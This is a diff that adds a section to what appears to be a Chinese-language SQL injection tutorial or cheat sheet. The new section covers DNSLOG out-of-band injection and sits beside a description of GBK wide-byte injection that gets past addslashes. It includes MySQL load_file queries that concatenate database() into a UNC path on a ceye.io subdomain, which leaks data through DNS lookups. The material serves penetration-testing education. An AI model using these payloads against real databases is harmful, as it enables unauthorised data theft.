@@ -215,6 +215,34 @@ http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) 
 国内最常使用的 GBK 编码，这种方式主要是绕过 `addslashes` 等对特殊字符进行转移的绕过。反斜杠 `\` 的十六进制为 `%5c`，在你输入 `%bf%27` 时，函数遇到单引号自动转移加入 `\`，此时变为 `%bf%5c%27`，`%bf%5c`
 在 GBK 中变为一个宽字符「縗」。`%bf` 那个位置可以是 `%81-%fe` 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
 
+### DNSLOG注入
+
+**DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。**
+
+dnslog平台：[http://ceye.io/](http://ceye.io/)
+
+```
+mysql> use security;
+Database changed
+
+mysql> select load_file('\\\\test.xxx.ceye.io\\abc');
++-------------------------------------------+
+| load_file('\\\\test.xxx.ceye.io\\abc') |
++-------------------------------------------+
+| NULL                                      |
++-------------------------------------------+
+1 row in set (22.05 sec)
+
+mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
++----------------------------------------------------------------------+
+| load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc')) |
++----------------------------------------------------------------------+
+| NULL                                                                 |
++----------------------------------------------------------------------+
+1 row in set (0.00 sec)
+```
+![](./php/figure/preg_match/sqli1.png)
+
 ## 参考资料
 
 -   [SQL 注入速查表](http://static.hx99.net/static/drops/tips-7840.html)
